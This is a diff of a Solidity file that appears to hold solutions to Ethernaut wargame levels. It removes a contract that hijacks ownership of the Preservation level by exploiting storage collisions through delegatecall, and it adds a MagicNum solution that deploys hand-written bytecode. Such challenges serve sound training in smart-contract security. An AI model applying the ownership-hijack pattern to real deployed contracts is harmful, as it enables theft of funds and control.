@@ -1,28 +1,19 @@
 // SPDX-License-Identifier: WTFPL
 pragma solidity 0.8.7;
 
-interface IPreservation {
-    function setFirstTime(uint _timeStamp) external;
+contract Hack {
+    event Deploy_Success(address addr);
+
+    function attack() external {
+        bytes memory bytecode = hex"69602a60005260206000f3600052600a6016f3";
+        address contractAddress;
+        assembly {
+            contractAddress := create(0, add(bytecode, 0x20), 0x13)
+        }
+        emit Deploy_Success(contractAddress);
+    }
 }
 
-contract Hack {
-    address public timeZone1Library;
-    address public timeZone2Library;
-    address public owner;
-    uint storedTime;
-
-    IPreservation public preservation;
-
-    constructor(address contractAddress) {
-        preservation = IPreservation(contractAddress);
-    }
-
-    function attack() public {
-        preservation.setFirstTime(uint256(uint160(address(this))));
-        preservation.setFirstTime(uint256(uint160(msg.sender)));
-    }
-
-    function setTime(uint _time) public {
-        owner = address(uint160(_time));
-    }
+interface IMagicNum {
+    function whatIsTheMeaningOfLife() external view returns (uint);
 }
